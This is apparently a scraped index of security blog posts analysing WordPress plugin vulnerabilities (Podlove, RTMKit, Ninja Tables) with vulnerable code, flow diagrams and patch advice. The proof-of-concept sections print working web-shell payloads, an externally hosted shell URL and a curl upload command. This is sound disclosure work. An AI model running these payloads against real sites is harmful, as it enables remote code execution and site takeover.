POC","uri":"/posts/2025-11-05-cve-2025-10147/#requirements"},{"categories":["CVE Analysis"],"collections":null,"content":"Analysis\r","date":"2025-11-05","objectID":"/posts/2025-11-05-cve-2025-10147/:3:0","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2025-10147 Analysis \u0026 POC","uri":"/posts/2025-11-05-cve-2025-10147/#analysis"},{"categories":["CVE Analysis"],"collections":null,"content":"Vulnerable Code\rAccording to the CVE description the vulnerability is located in the move_as_original_file() function public function move_as_original_file($file) { $move_new_file = @rename($file, $this-\u003eoriginal_file()); if (false === $move_new_file) { Log::get()-\u003eaddWarning( sprintf( __('Podlove Image Cache: The downloaded image could not be moved to %s.'), $this-\u003eoriginal_file() ) ); } } The move_as_original_file($file) function Performs a move of the temporary file $file (just downloaded from the URL) → to the fixed path returned by $this-\u003eoriginal_file(). rename() in PHP = move file (relocates the file, not copy). The @ operator suppresses PHP warnings if the operation fails. If rename() returns false, the plugin logs a warning. public function original_file() { return implode(DIRECTORY_SEPARATOR, [ $this-\u003eupload_basedir, $this-\u003efile_name('original') ]); } → Produces an absolute path on the server, for example: /var/www/html/wp-content/cache/podlove/6e/7262f37a8018efafa4764ea97a4c26/original.png $this-\u003eupload_basedir (from __construct()) Class Image { public function __construct($url, $file_name = '') { // FIXME: if $file_name is empty, the url will not work. I must not treat this silently! $this-\u003esource_url = trim($url ?? ''); $this-\u003efile_name = sanitize_title($file_name); // manually remove troublemaking characters // @see https://community.podlove.org/t/solved-kind-of-cover-art-disappears-caching-issue/478/ // @see https://sendegate.de/t/problem-mit-caching-von-grafiken/2947 if (function_exists('iconv')) { $this-\u003efile_name = iconv('UTF-8', 'ASCII//TRANSLIT', $this-\u003efile_name); } $this-\u003efile_name = preg_replace('~[^-a-z0-9_]+~', '', $this-\u003efile_name); $this-\u003efile_extension = $this-\u003eextract_file_extension(); $this-\u003eid = md5($url.$this-\u003efile_name); // create subdirectories to avoid too many directories in the root directory $id_directory = substr($this-\u003eid, 0, 2).'/'.substr($this-\u003eid, 2); $this-\u003eupload_basedir = self::cache_dir().$id_directory; $this-\u003eupload_baseurl = content_url('cache/podlove/').$id_directory; } } Built from cache_dir() and an MD5 hash of the URL, → located under the directory: wp-content/cache/podlove/\u003cfirst 2 characters\u003e/\u003cremaining characters\u003e/ Tip Here you can pass only $url, for example: $url=\"https://example.com/filename.php\" then $this-\u003eid=\"b1555a128239e3f59ccfb8d17e5b6c5a\" $this-\u003eupload_basedir=\"http://localhost/wp-content/cache/podlove/b1/555a128239e3f59ccfb8d17e5b6c5a\" You can control the resulting file path.\rmove_as_original_file() is called inside download_source() public function download_source() { $source_url = $this-\u003esource_url; ... $source_domain = wp_parse_url($source_url, PHP_URL_HOST); $current_domain = explode(':', $_SERVER['HTTP_HOST'])[0]; // if domains match, see if the image is part of the Publisher // and can be copied on the filesystem, skipping http if ($current_domain == $source_domain) { ... return; } // for download_url() require_once ABSPATH.'wp-admin/includes/file.php'; $result = self::download_url($this-\u003esource_url); ... list($temp_file, $response) = $result; if (!\\Podlove\\is_image($temp_file)) { ... wp_delete_file($temp_file); return; } $this-\u003ecreate_basedir(); $this-\u003esave_cache_data($response); $this-\u003emove_as_original_file($temp_file); wp_delete_file($temp_file); $this-\u003eadd_donotbackup_dotfile(); } This function downloads the image from the user-provided URL, validates it, then saves it into the plugin’s cache directory. Specifically: $source_url takes the image URL provided by the user. The function extracts the domain from $source_url and the site’s current domain ($_SERVER['HTTP_HOST']). If the two domains match → the image is considered part of the Publisher and the logic returns. If different domains → it uses download_url() to fetch the file temporarily on the server. public static function download_url($url, $timeout = 300, $extra_args = []) { ... $tmpfname = wp_tempnam($url); if (!$tmpfname) { return new \\WP_Error('http_no_file', __('Could not create Temporary ","date":"2025-11-05","objectID":"/posts/2025-11-05-cve-2025-10147/:3:1","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2025-10147 Analysis \u0026 POC","uri":"/posts/2025-11-05-cve-2025-10147/#vulnerable-code"},{"categories":["CVE Analysis"],"collections":null,"content":"Flow\rgraph TD\rA[\"Request with params (podlove_image_cache_url)\"] --\u003e B[\"podlove_handle_cache_files()\"]\rB --\u003e C[\"hex2str() → $source_url → new Image(...)\"]\rC --\u003e D[\"download_source() → download_url() → temporary file\"]\rD --\u003e E[\"is_image() check\"]\rE -- pass --\u003e F[\"move_as_original_file() → save to wp-content/cache/podlove/first_2_characters/remaining_characters/\"]\rF --\u003e G[\"File accessible → possible RCE\"]\rE -- fail --\u003e H[\"Delete temp file → stop\"]\rgraph TD\rA[\"Request with params (podlove_image_cache_url)\"] --\u003e B[\"podlove_handle_cache_files()\"]\rB --\u003e C[\"hex2str() → $source_url → new Image(...)\"]\rC --\u003e D[\"download_source() → download_url() → temporary file\"]\rD --\u003e E[\"is_image() check\"]\rE -- pass --\u003e F[\"move_as_original_file() → save to wp-content/cache/podlove/first_2_characters/remaining_characters/\"]\rF --\u003e G[\"File accessible → possible RCE\"]\rE -- fail --\u003e H[\"Delete temp file → stop\"]\rgraph TD\rA[\"Request with params (podlove_image_cache_url)\"] --\u003e B[\"podlove_handle_cache_files()\"]\rB --\u003e C[\"hex2str() → $source_url → new Image(...)\"]\rC --\u003e D[\"download_source() → download_url() → temporary file\"]\rD --\u003e E[\"is_image() check\"]\rE -- pass --\u003e F[\"move_as_original_file() → save to wp-content/cache/podlove/first_2_characters/remaining_characters/\"]\rF --\u003e G[\"File accessible → possible RCE\"]\rE -- fail --\u003e H[\"Delete temp file → stop\"]\rgraph TD\rA[\"Request with params (podlove_image_cache_url)\"] --\u003e B[\"podlove_handle_cache_files()\"]\rB --\u003e C[\"hex2str() → $source_url → new Image(...)\"]\rC --\u003e D[\"download_source() → download_url() → temporary file\"]\rD --\u003e E[\"is_image() check\"]\rE -- pass --\u003e F[\"move_as_original_file() → save to wp-content/cache/podlove/first_2_characters/remaining_characters/\"]\rF --\u003e G[\"File accessible → possible RCE\"]\rE -- fail --\u003e H[\"Delete temp file → stop\"]\r","date":"2025-11-05","objectID":"/posts/2025-11-05-cve-2025-10147/:3:2","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2025-10147 Analysis \u0026 POC","uri":"/posts/2025-11-05-cve-2025-10147/#flow"},{"categories":["CVE Analysis"],"collections":null,"content":"Exploit\r","date":"2025-11-05","objectID":"/posts/2025-11-05-cve-2025-10147/:4:0","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2025-10147 Analysis \u0026 POC","uri":"/posts/2025-11-05-cve-2025-10147/#exploit"},{"categories":["CVE Analysis"],"collections":null,"content":"Proof of Concept (PoC)\rInject a \u003cphp\u003e tag into an image file and rename the file to .php echo '\u003c?php system($_REQUEST[\"cmd\"]); ?\u003e' \u003e\u003e rce.png mv rce.png rce.php ❯ cat rce.php �PNG ␦ IHD��Ud�tEXtSoftwaregnome-screenshot��\u003e-tEXtCreation TimeSat 01 Nov 2025 02:58:29 PM +075����IDATH���A � ��GHI��l��l�˅��K�n�D �H)���a:kooܲ\u003c`�u�o� �{�3�9�1�~�� �9����P�1����R�!D\u003eLk���FT�r�|�Ru�� u��o'�`��?�!\"�� 2k���IEND�B`�\u003c?php system($_REQUEST[\"cmd\"]); ?\u003e Host the file somewhere on the internet on a domain different from the WordPress site, for example: https://github.com/w41bu1/w41test/raw/refs/heads/main/rce.php Hex-encode the URL (https://github.com/w41bu1/w41test/raw/refs/heads/main/rce.php) ❯ echo -n \"https://github.com/w41bu1/w41test/raw/refs/heads/main/rce.php\" | xxd -p 68747470733a2f2f6769746875622e636f6d2f7734316275312f773431746573742f7261772f726566732f68656164732f6d61696e2f7263652e706870 Send a GET request with param podlove_image_cache_url=68747470733a2f2f6769746875622e636f6d2f7734316275312f773431746573742f7261772f726566732f68656164732f6d61696e2f7263652e706870 File uploaded successfully\rAccess the created file and achieve RCE RCE via uploaded file\rInfo\r02/9acf743e6beb9c8e4395ee694d6504 as analyzed earlier is md5($url), then the directory structure first_2_characters/remaining_characters is created from that md5() result ","date":"2025-11-05","objectID":"/posts/2025-11-05-cve-2025-10147/:4:1","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2025-10147 Analysis \u0026 POC","uri":"/posts/2025-11-05-cve-2025-10147/#proof-of-concept-poc"},{"categories":["CVE Analysis"],"collections":null,"content":"Conclusion\rThe vulnerability in Podlove Podcast Publisher ≤ 4.2.6 allows arbitrary file upload due to missing file type validation in move_as_original_file(). An attacker can upload malicious files (e.g., .php) into: wp-content/cache/podlove/\u003cfirst2\u003e/\u003crest\u003e/, which can lead to Remote Code Execution (RCE) if the file is publicly accessible. ","date":"2025-11-05","objectID":"/posts/2025-11-05-cve-2025-10147/:5:0","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2025-10147 Analysis \u0026 POC","uri":"/posts/2025-11-05-cve-2025-10147/#conclusion"},{"categories":["CVE Analysis"],"collections":null,"content":"Key Takeaway\rRoot cause: weak MIME checking and no blocking of dangerous extensions. Patch (≥ 4.2.7): added validation using wp_check_filetype_and_ext() and a denylist. Mitigation: update the plugin, prevent PHP execution in the cache directory, and remove suspicious files. ","date":"2025-11-05","objectID":"/posts/2025-11-05-cve-2025-10147/:6:0","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2025-10147 Analysis \u0026 POC","uri":"/posts/2025-11-05-cve-2025-10147/#key-takeaway"},{"categories":["CVE Analysis"],"collections":null,"content":"References\rArbitrary File Upload WordPress Podlove Podcast Publisher Plugin \u003c= 4.2.6 is vulnerable to Arbitrary File Upload ","date":"2025-11-05","objectID":"/posts/2025-11-05-cve-2025-10147/:7:0","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2025-10147 Analysis \u0026 POC","uri":"/posts/2025-11-05-cve-2025-10147/#references"},{"categories":["CVE Analysis"],"collections":null,"content":"Security Vulnerability in WordPress RTMKit Plugin.","date":"2025-11-04","objectID":"/posts/2025-11-04-cve-2025-62065/","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2025-62065 Analysis \u0026 POC","uri":"/posts/2025-11-04-cve-2025-62065/"},{"categories":["CVE Analysis"],"collections":null,"content":"CVE \u0026 Basic Info\rCVE ID: CVE-2025-62065 Vulnerability Type: Arbitrary File Upload Affected Versions: \u003c= 1.6.5 Patched Versions: 1.6.6 CVSS severity: Medium (9.9) Required Privilege: Contributor Product: WordPress RTMKit Plugin ","date":"2025-11-04","objectID":"/posts/2025-11-04-cve-2025-62065/:1:0","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2025-62065 Analysis \u0026 POC","uri":"/posts/2025-11-04-cve-2025-62065/#cve--basic-info"},{"categories":["CVE Analysis"],"collections":null,"content":"Requirements\rLocal WordPress \u0026 Debugging: Local WordPress and Debugging. Plugin versions - RTMKit: 1.6.5 (vulnerable) and 1.6.6 (patched). Diff tool - Meld or any diff comparison tool to inspect and compare differences between the two versions. Elementor ","date":"2025-11-04","objectID":"/posts/2025-11-04-cve-2025-62065/:2:0","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2025-62065 Analysis \u0026 POC","uri":"/posts/2025-11-04-cve-2025-62065/#requirements"},{"categories":["CVE Analysis"],"collections":null,"content":"Analysis\r","date":"2025-11-04","objectID":"/posts/2025-11-04-cve-2025-62065/:3:0","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2025-62065 Analysis \u0026 POC","uri":"/posts/2025-11-04-cve-2025-62065/#analysis"},{"categories":["CVE Analysis"],"collections":null,"content":"Patch diff\rfunction rtm_handle_upload_template() { check_ajax_referer('rtm_template_nonce', 'nonce'); if (empty($_FILES['file'])) { wp_send_json_error('No file uploaded.'); } $file = $_FILES['file']; $ext = strtolower(pathinfo($file['name'], PATHINFO_EXTENSION)); if ($ext !== 'zip') { wp_send_json_error('Only .zip files are allowed.'); } $upload_dir = wp_upload_dir(); // path on server $tmpFilePath = $upload_dir['basedir'] . '/rtm_temp_' . wp_unique_filename($upload_dir['basedir'], $file['name']); // public URL $tmpFileUrl = $upload_dir['baseurl'] . '/' . basename($tmpFilePath); if (!move_uploaded_file($file['tmp_name'], $tmpFilePath)) { wp_send_json_error('Failed to save temporary file.'); } $res = $this-\u003etemplate_extract($tmpFileUrl, $file['name'], true); // after done remove file if (file_exists($tmpFilePath)) unlink($tmpFilePath); if ($res) { wp_send_json_success('Template successfully uploaded and extracted.'); } else { wp_send_json_error($res); } } function template_extract($url, $id, $return = false) { $upload_dir = wp_upload_dir(); $custom_dir = $upload_dir['basedir'] . '/rometheme_template'; $tempFile = wp_tempnam($url); $hashId = wp_hash($id); $targetDir = $custom_dir . '/' . $hashId; $response = wp_remote_get($url, ['timeout' =\u003e 300]); if (is_wp_error($response)) { wp_send_json_error($response-\u003eget_error_message()); } $fileContent = wp_remote_retrieve_body($response); file_put_contents($tempFile, $fileContent); $zip = new ZipArchive(); if ($zip-\u003eopen($tempFile) === TRUE) { wp_mkdir_p($targetDir); $zip-\u003eextractTo($targetDir); $zip-\u003eclose(); unlink($tempFile); $option = get_option('rtm_template_installed', []); // Default to array if option not present if (!is_array($option)) { $option = []; // Ensure $option is an array } $option[$hashId] = [ 'template_id' =\u003e $id ]; update_option('rtm_template_installed', $option); // Save back to database if ($return) { return true; } else { wp_send_json_success(['message' =\u003e 'success extract', 'template' =\u003e $hashId]); } } } In the vulnerable version: No proper user capability check: it only calls check_ajax_referer() but does not verify capability (e.g., current_user_can) → a user with a valid nonce or a leaked nonce can still upload. Temporary file saved in the public uploads folder (wp_upload_dir()): $tmpFilePath is under uploads/ so it is accessible via a URL ($tmpFileUrl) while the file exists. Retrieves the file via the public URL before extraction: template_extract() uses wp_remote_get($tmpFileUrl) → depends on a public URL. Extracts directly into a public directory: extractTo($targetDir) into uploads/rometheme_template → if a .php file is placed, the webserver may execute it. No whitelist/deny for extensions: does not remove or reject executable files (.php, .phtml, .phar, .sh, .exe, …). No content check for embedded PHP: there is no step to scan for \u003c?php before saving. Temporary public exposure risk: because the temp file is public during processing, an attacker has time to access/set up payload before the file is unlinked. =\u003e High likelihood of RCE. function rtm_handle_upload_template() { check_ajax_referer('rtm_template_nonce', 'nonce'); if (empty($_FILES['file'])) { wp_send_json_error('No File Uploaded.'); } if (! current_user_can('manage_options')) { wp_send_json_error( array('message' =\u003e 'Insufficient permissions'), 403 ); } $file = $_FILES['file']; $ext = strtolower(pathinfo($file['name'], PATHINFO_EXTENSION)); if ($ext !== 'zip') { wp_send_json_error('Only .zip file allowed.'); } $upload_dir = wp_upload_dir(); // Safe directory (not directly in public uploads) $base_safe_dir = $upload_dir['basedir'] . '//rometheme_template/'; $tmp_dir = $base_safe_dir . 'tmp/'; if (! file_exists($tmp_dir)) { wp_mkdir_p($tmp_dir); // prevent php execution in this folder @file_put_contents( $base_safe_dir . '.htaccess', \"Options -Indexes \u003cFilesMatch \".(php|phtml|phar)$\"\u003e Deny from all\u003c/FilesMatch\u003e\" ); } // Create unique name for zip $unique = wp_generate_password(12, false); $tmp_zip_","date":"2025-11-04","objectID":"/posts/2025-11-04-cve-2025-62065/:3:1","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2025-62065 Analysis \u0026 POC","uri":"/posts/2025-11-04-cve-2025-62065/#patch-diff"},{"categories":["CVE Analysis"],"collections":null,"content":"Vulnerable Code\rIn the vulnerable version, the handler accepts an uploaded file (expects .zip), saves it to the uploads/ folder, then calls template_extract() to fetch and extract it. Finally it removes the temp file and returns JSON success/fail. Specifically: check_ajax_referer('rtm_template_nonce', 'nonce') Helps protect against CSRF — ensures the AJAX request is valid and contains a nonce. Searching for rtm_template_nonce in the plugin folder shows: How the nonce with action rtm_template_nonce is created\rwp_localize_script() will print an inline \u003cscript\u003e into the page and in it declare a JS object variable. In this case, the object rkit_libs stores values logo_url, ajax_url, template_nonce. Tip Because the vulnerability is disclosed with Contributor privileges required, and Contributors can usually create posts, we try creating a post and accessing the rkit_libs object from the browser console to obtain the nonce. Info\rWe edit the post using Elementor, because the plugin’s widgets are used in Elementor; the default editor does not include them. Get nonce from browser console\rCheck $_FILES['file'] and extension: if (empty($_FILES['file'])) { wp_send_json_error('No file uploaded.'); } $file = $_FILES['file']; $ext = strtolower(pathinfo($file['name'], PATHINFO_EXTENSION)); if ($ext !== 'zip') { wp_send_json_error('Only .zip files are allowed.'); } Ensures client sent a file and only allows .zip uploads. Determine temporary path and public URL $upload_dir = wp_upload_dir(); $tmpFilePath = $upload_dir['basedir'] . '/rtm_temp_' . wp_unique_filename($upload_dir['basedir'], $file['name']); $tmpFileUrl = $upload_dir['baseurl'] . '/' . basename($tmpFilePath); Creates a temp filename inside the uploads directory and the access URL to that file, e.g.: $tmpFilePath = \"/var/www/html/wp-content/uploads/rtm_temp_filename.zip\" $tmpFileUrl = \"http://localhost/wp-content/uploads/rtm_temp_filename.zip\" move_uploaded_file($file['tmp_name'], $tmpFilePath) Moves the uploaded file from PHP temp into the defined temporary location. Call template_extract($tmpFileUrl, $file['name'], true) function template_extract($url, $id, $return = false) { // Get WordPress upload dir and create template directory $upload_dir = wp_upload_dir(); $custom_dir = $upload_dir['basedir'] . '/rometheme_template'; // Create temporary file to download file from URL $tempFile = wp_tempnam($url); // Create hash ID for template $hashId = wp_hash($id); $targetDir = $custom_dir . '/' . $hashId; // Download file from URL $response = wp_remote_get($url, ['timeout' =\u003e 300]); // Check for errors during download if (is_wp_error($response)) { wp_send_json_error($response-\u003eget_error_message()); } // Save the ZIP contents into temp file $fileContent = wp_remote_retrieve_body($response); file_put_contents($tempFile, $fileContent); // Open ZIP and extract into target directory $zip = new ZipArchive(); if ($zip-\u003eopen($tempFile) === TRUE) { wp_mkdir_p($targetDir); // Create dir if not exists $zip-\u003eextractTo($targetDir); // Extract to target dir $zip-\u003eclose(); unlink($tempFile); // Remove temp file // Update 'rtm_template_installed' option in database $option = get_option('rtm_template_installed', []); if (!is_array($option)) { $option = []; } $option[$hashId] = ['template_id' =\u003e $id]; update_option('rtm_template_installed', $option); // Return result if ($return) { return true; } else { wp_send_json_success(['message' =\u003e 'success extract', 'template' =\u003e $hashId]); } } } Info\rHere the file is not extracted directly (i.e., not allowing Zip Slip to place files outside target), so Zip Slip techniques to move files to higher directories are not applicable. The final files are saved under {wp_upload_dir}/rometheme_template/{hashId}/ Returns JSON rtm_handle_upload_template() is registered as the callback for the action hook: add_action('wp_ajax_rtm_handle_upload_template', [$this, 'rtm_handle_upload_template']); Meaning: When a user sends an AJAX request to wp-admin/admin-ajax.php with action=rtm","date":"2025-11-04","objectID":"/posts/2025-11-04-cve-2025-62065/:3:2","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2025-62065 Analysis \u0026 POC","uri":"/posts/2025-11-04-cve-2025-62065/#vulnerable-code"},{"categories":["CVE Analysis"],"collections":null,"content":"Flow\rgraph LR;\rA[POST REQUEST /wp-admin/admin-ajax.php?action=rtm_handle_upload_template] --\u003e B[\"rtm_handle_upload_template()\"]\rB --\u003e C{is .zip extension}\rC --\u003e|True| D{\"check_ajax_referer()\"}\rC --\u003e|False| E[\"wp_send_json_error()\"]\rD --\u003e|True| F[\"template_extract()\"]\rD --\u003e|False| G[Return 401]\rF --\u003e|Extract To| H[\"{wp_upload_dir}/rometheme_template/{hashId}/\"]\rgraph LR;\rA[POST REQUEST /wp-admin/admin-ajax.php?action=rtm_handle_upload_template] --\u003e B[\"rtm_handle_upload_template()\"]\rB --\u003e C{is .zip extension}\rC --\u003e|True| D{\"check_ajax_referer()\"}\rC --\u003e|False| E[\"wp_send_json_error()\"]\rD --\u003e|True| F[\"template_extract()\"]\rD --\u003e|False| G[Return 401]\rF --\u003e|Extract To| H[\"{wp_upload_dir}/rometheme_template/{hashId}/\"]\rgraph LR;\rA[POST REQUEST /wp-admin/admin-ajax.php?action=rtm_handle_upload_template] --\u003e B[\"rtm_handle_upload_template()\"]\rB --\u003e C{is .zip extension}\rC --\u003e|True| D{\"check_ajax_referer()\"}\rC --\u003e|False| E[\"wp_send_json_error()\"]\rD --\u003e|True| F[\"template_extract()\"]\rD --\u003e|False| G[Return 401]\rF --\u003e|Extract To| H[\"{wp_upload_dir}/rometheme_template/{hashId}/\"]\rgraph LR;\rA[POST REQUEST /wp-admin/admin-ajax.php?action=rtm_handle_upload_template] --\u003e B[\"rtm_handle_upload_template()\"]\rB --\u003e C{is .zip extension}\rC --\u003e|True| D{\"check_ajax_referer()\"}\rC --\u003e|False| E[\"wp_send_json_error()\"]\rD --\u003e|True| F[\"template_extract()\"]\rD --\u003e|False| G[Return 401]\rF --\u003e|Extract To| H[\"{wp_upload_dir}/rometheme_template/{hashId}/\"]\r","date":"2025-11-04","objectID":"/posts/2025-11-04-cve-2025-62065/:3:3","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2025-62065 Analysis \u0026 POC","uri":"/posts/2025-11-04-cve-2025-62065/#flow"},{"categories":["CVE Analysis"],"collections":null,"content":"Exploit\r","date":"2025-11-04","objectID":"/posts/2025-11-04-cve-2025-62065/:4:0","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2025-62065 Analysis \u0026 POC","uri":"/posts/2025-11-04-cve-2025-62065/#exploit"},{"categories":["CVE Analysis"],"collections":null,"content":"Proof of Concept (PoC)\rLog in with a Contributor account Create a post and edit it using Elementor Retrieve rkit_libs.template_nonce to get the nonce Create a file for RCE \u003c?php system($_GET['cmd']) ?\u003e Zip the created file zip rce.zip rce.php Send the upload request curl -X POST \"http://localhost/wp-admin/admin-ajax.php\" \\ -b \"your_cookie\" \\ -F \"action=rtm_handle_upload_template\" \\ -F \"nonce=your_nonce\" \\ -F \"file=@rce.zip;filename=rce.zip;type=application/zip\" Access the uploaded file RCE via uploaded file\rQuestion\rI want to emphasize that although this file can be accessed directly, direct access is limited by the hashId, since WordPress by default does not allow directory listing. ","date":"2025-11-04","objectID":"/posts/2025-11-04-cve-2025-62065/:4:1","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2025-62065 Analysis \u0026 POC","uri":"/posts/2025-11-04-cve-2025-62065/#proof-of-concept-poc"},{"categories":["CVE Analysis"],"collections":null,"content":"Conclusion\rThe vulnerability is the chain: Arbitrary File Upload + temporary public file + uncontrolled extraction → risk of RCE. The patch (1.6.6) fixes this by checking capabilities, storing temporary files in a non-public location, whitelisting extensions, blocking traversal, and scanning content. ","date":"2025-11-04","objectID":"/posts/2025-11-04-cve-2025-62065/:5:0","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2025-62065 Analysis \u0026 POC","uri":"/posts/2025-11-04-cve-2025-62065/#conclusion"},{"categories":["CVE Analysis"],"collections":null,"content":"Key takeaways\rUpdate to 1.6.6 immediately. If you cannot update: disable template upload or restrict it to admins only. Always store uploaded files in non-public locations, whitelist extensions, block path traversal and scan contents before extraction. ","date":"2025-11-04","objectID":"/posts/2025-11-04-cve-2025-62065/:6:0","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2025-62065 Analysis \u0026 POC","uri":"/posts/2025-11-04-cve-2025-62065/#key-takeaways"},{"categories":["CVE Analysis"],"collections":null,"content":"References\rArbitrary File Upload WordPress RTMKit Plugin \u003c= 1.6.5 is vulnerable to Arbitrary File Upload ","date":"2025-11-04","objectID":"/posts/2025-11-04-cve-2025-62065/:7:0","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2025-62065 Analysis \u0026 POC","uri":"/posts/2025-11-04-cve-2025-62065/#references"},{"categories":["CVE Analysis"],"collections":null,"content":"Security Vulnerability in WordPress Ninja Tables Plugin.","date":"2025-11-03","objectID":"/posts/2025-11-03-cve-2025-2940/","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-2940 Analysis \u0026 POC","uri":"/posts/2025-11-03-cve-2025-2940/"},{"categories":["CVE Analysis"],"collections":null,"content":"CVE \u0026 Basic Info\rThe Ninja Tables – Easy Data Table Builder plugin for WordPress contains a Server-Side Request Forgery (SSRF) vulnerability in all versions up to and including 5.0.18, via the args[url] parameter. This vulnerability allows unauthenticated attackers to perform web requests to arbitrary locations originating from the web application, and can be used to query and modify information from internal services. CVE ID: CVE-2025-2940 Vulnerability Type: Server Side Request Forgery (SSRF) Affected Versions: \u003c= 5.0.18 Patched Versions: 5.0.19 CVSS severity: Medium (7.2) Required Privilege: Unauthenticated Product: WordPress Ninja Tables Plugin ","date":"2025-11-03","objectID":"/posts/2025-11-03-cve-2025-2940/:1:0","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-2940 Analysis \u0026 POC","uri":"/posts/2025-11-03-cve-2025-2940/#cve--basic-info"},{"categories":["CVE Analysis"],"collections":null,"content":"Requirements\rLocal WordPress \u0026 Debugging: Local WordPress and Debugging. Plugin versions - Ninja Tables: 5.0.18 (vulnerable) and 5.0.19 (patched). Diff tool - Meld or any diff tool to inspect and compare differences between the two versions. ","date":"2025-11-03","objectID":"/posts/2025-11-03-cve-2025-2940/:2:0","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-2940 Analysis \u0026 POC","uri":"/posts/2025-11-03-cve-2025-2940/#requirements"},{"categories":["CVE Analysis"],"collections":null,"content":"Analysis\r","date":"2025-11-03","objectID":"/posts/2025-11-03-cve-2025-2940/:3:0","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-2940 Analysis \u0026 POC","uri":"/posts/2025-11-03-cve-2025-2940/#analysis"},{"categories":["CVE Analysis"],"collections":null,"content":"Patch diff\rPer the CVE description, the notable location in the patch is the code handling args[url] — this is likely the root cause of the vulnerability since this parameter is used directly in the request flow. Precondition location causing the vulnerability\rIn the patch, the exploitable code has been disabled (commented out with //). ","date":"2025-11-03","objectID":"/posts/2025-11-03-cve-2025-2940/:3:1","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-2940 Analysis \u0026 POC","uri":"/posts/2025-11-03-cve-2025-2940/#patch-diff"},{"categories":["CVE Analysis"],"collections":null,"content":"Vulnerable Code\rpublic static function registerAsyncRequestHandler() { $action = static::makeAsyncRequestAction(); App::addAction(\"admin_post_nopriv_{$action}\", function() { $request = App::make('request'); $requestUrl = $request-\u003eget('args.url'); $requestMethod = $request-\u003eget('args.method'); $client = Client::make($requestUrl); $params = $request-\u003eexcept( 'action', 'args.url', 'args.method', )['args']; $callback = static::getCallback($params); $response = $client-\u003e{$requestMethod}('', $params); if (is_wp_error($response)) { $exception = new Exception( $response-\u003eget_error_message(), 500 ); } return $callback($response, $exception ?? null); }); } The registerAsyncRequestHandler() function registers and handles an async endpoint in WordPress — specifically via admin_post_nopriv_{action}, i.e., a hook that allows unauthenticated (nopriv) users to send requests. Specifically, the function processes as follows: Create a unique action name for the plugin $action = static::makeAsyncRequestAction(); protected static function makeAsyncRequestAction() { return 'wpf-async-request-' . sha1( App::config()-\u003eget('app.slug') // plugin name: ninja-tables ); } makeAsyncRequestAction() generates a unique identifier for the plugin by concatenating a fixed prefix (wpf-async-request-) with the SHA1 hash of the plugin name (app.slug). Since the plugin name is \"ninja-tables\", the resulting value will be: wpf-async-request-5198d2fbe51aebbce20ad69b9ada4d77993bbc77 Register the action hook with an anonymous callback App::addAction(\"admin_post_nopriv_{$action}\", function() { ... }); When an HTTP request is sent to /wp-admin/admin-post.php?action=wpf-async-request-5198d2fbe51aebbce20ad69b9ada4d77993bbc77 the logic inside the anonymous function will be invoked. Retrieve the Request object instance from the App container and read two main parameters $request = App::make('request'); $requestUrl = $request-\u003eget('args.url'); $requestMethod = $request-\u003eget('args.method'); Instantiate a Client object with the baseUrl taken from the request $client = Client::make($requestUrl); public static function make($baseUrl = '', $args = []) { $args['cookies'] = $args['cookies'] ?? []; $args['headers'] = $args['headers'] ?? []; $args['options'] = $args['options'] ?? []; return new static($baseUrl, $args); } Client::make() is responsible for creating and configuring a new Client instance used to manage and send HTTP requests. The $baseUrl value is passed directly from $requestUrl — i.e., the URL provided by the user in args.url. Collect all other parameters except action, args.url, args.method $params = $request-\u003eexcept( 'action', 'args.url', 'args.method', )['args']; Decode and extract the callback function from the request parameters $callback = static::getCallback($params); protected static function getCallback(\u0026$params) { $callback = unserialize(base64_decode($params['callback'])); unset($params['callback']); return $callback; } getCallback() is used to extract a callback function provided in the args.callback parameter of the request. Invoke the $requestMethod with $params $response = $client-\u003e{$requestMethod}('', $params); For example: if $requestMethod is POST =\u003e $response = $client-\u003ePOST('', $params) Error check and return if (is_wp_error($response)) { $exception = new Exception( $response-\u003eget_error_message(), 500 ); } return $callback($response, $exception ?? null); Question\rWhat happens if $requestMethod does not exist — i.e., $client calls a method that is not present in the Client class? In this case, PHP will automatically invoke the magic __call() method declared in the Client class. __call() is designed to handle calls to non-existing methods, allowing the Client to perform dynamic requests based on the invoked method name. Observing the Outline tab shows all methods, properties and functions in the file in order. Outline of Client.php\rpublic function __call($method, $args) { if ($method === 'download') { return $this-\u003edownloadFile(...$args); } // Handles d","date":"2025-11-03","objectID":"/posts/2025-11-03-cve-2025-2940/:3:2","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-2940 Analysis \u0026 POC","uri":"/posts/2025-11-03-cve-2025-2940/#vulnerable-code"},{"categories":["CVE Analysis"],"collections":null,"content":"Flow\rgraph TD\rA[\"HTTP Request\"] --\u003e B[\"admin_post_nopriv_{action}\"]\rB --\u003e C[\"$request-\u003eget('args.url') / $request-\u003eget('args.method')\"]\rC --\u003e D[\"$client-\u003e{$requestMethod}('', $params)\"]\rD --\u003e E[\"Client::__call() → request() → wp_remote_request() ← SSRF sink\"]\rE --\u003e F[\"Response → callback → HTTP Response\"]\rgraph TD\rA[\"HTTP Request\"] --\u003e B[\"admin_post_nopriv_{action}\"]\rB --\u003e C[\"$request-\u003eget('args.url') / $request-\u003eget('args.method')\"]\rC --\u003e D[\"$client-\u003e{$requestMethod}('', $params)\"]\rD --\u003e 